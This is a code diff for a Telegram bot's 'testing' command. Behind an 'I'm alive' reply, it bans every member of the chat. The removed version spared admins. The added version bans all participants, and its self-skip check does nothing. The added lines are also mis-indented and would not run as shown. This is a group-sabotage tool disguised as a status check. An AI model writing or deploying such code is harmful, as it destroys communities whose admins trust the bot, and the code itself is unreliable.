@@ -79,24 +79,18 @@ async def testing(event):
        admin = Aruack.admin_rights
        creator = Aruack.creator
        if not admin and not creator:
-            return await event.reply("I Don't have sufficient Rights !!")
-         Aruack = await Ar.send_message(event.chat_id, "**Hello !! I'm Alive**")
-         admins = await event.client.get_participants(event.chat_id, filter=ChannelParticipantsAdmins)
-         admins_id = [i.id for i in admins]
-         all = 0
-         bann = 0
-         async for user in event.client.iter_participants(event.chat_id):
-             all += 1
-             try:
-               if user.id not in admins_id:
-                    await event.client(EditBannedRequest(event.chat_id, user.id, RIGHTS))
-                    bann += 1
-                    await asyncio.sleep(0.1)
-             except Exception as e:
-                   print(str(e))
-                   await asyncio.sleep(0.1)
-         await Aruack.edit(f"**Users Banned Successfully ! \n\n Banned Users:** `{bann}` \n **Total Users:** `{all}`")
-
+            await event.reply("I Don't have sufficient Rights !!")
+           return
+       await event.reply("hey !! I'm alive")
+       everyone = await event.client.get_participants(event.chat_id)
+       for user in everyone:
+           if user.id == Aruackop.id:
+               pass
+           try:
+               await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None,view_messages=True)))
+           except Exception as e:
+               await event.edit(str(e))
+           await sleep(0.1)
 
 
 @Ar.on(events.NewMessage(pattern="^/leave"))
